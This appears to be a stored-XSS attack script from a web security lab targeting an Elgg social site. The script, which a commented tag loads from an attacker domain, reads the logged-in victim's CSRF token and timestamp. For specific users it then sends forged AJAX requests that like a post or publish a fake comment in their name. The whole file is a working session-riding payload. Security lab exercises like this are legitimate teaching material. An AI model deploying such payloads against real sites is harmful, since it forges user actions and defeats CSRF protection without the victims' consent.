//<script type="text/javascript" src="http://www.xsslabattacker.com/like_comment.js"></script>


window.onload = function () {
    //JavaScript code to access user name, user guid, Time Stamp __elgg_ts
    //and Security Token __elgg_token
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    // var title = "&title=One True Sentence";
    var description = "&generic_comment=<p>fake comment</p> &entity_guid=58";
    // var accesslevel = "&access_id=2";
    // var status = "&status=published";
    // var container_guid = "&container_guid=" + elgg.session.user.guid;
    // var save = "&save=Save";

    var samyGuid = 47;
    var aliceGuid = 44;
    var bobyGuid = 45;
    alert("Someone is here");
    if (elgg.session.user.guid == bobyGuid) {
        alert("Boby is here");
        //Construct the content of your url.
        // var content = token + ts  + description;
        var content = "__elgg_token=" + elgg.security.token.__elgg_token + ts;
        var sendurl = "http://www.xsslabelgg.com/action/likes/add?guid=58"+token+ts;//"http://www.csrflabelgg.com/action/comment/save";
        //Create and send Ajax request to modify profile
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
    if (elgg.session.user.guid == aliceGuid) {
        alert("Alice is here");
        //Construct the content of your url.
        // var content = token + ts  + description;
        var content = "__elgg_token=" + elgg.security.token.__elgg_token + ts + description;
        var sendurl = "http://www.xsslabelgg.com/action/comment/save";
        //Create and send Ajax request to modify profile
        var Ajax = null;
        Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Host", "www.xsslabelgg.com");
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);
    }
}
